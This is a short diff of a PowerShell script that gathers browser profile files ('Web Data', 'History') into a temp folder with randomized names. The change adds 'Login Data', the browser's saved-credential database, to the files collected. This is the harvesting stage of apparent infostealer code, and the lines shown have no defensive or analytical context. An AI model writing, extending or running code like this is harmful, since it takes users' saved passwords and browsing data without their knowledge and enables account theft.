@@ -7,7 +7,7 @@ if (!(Test-Path $tempFolder)){
     New-Item -Path $tempFolder -ItemType Directory -Force
 }
 
-$filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
+$filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'Login Data' }
 foreach ($file in $filesToCopy) {
     $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
     $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
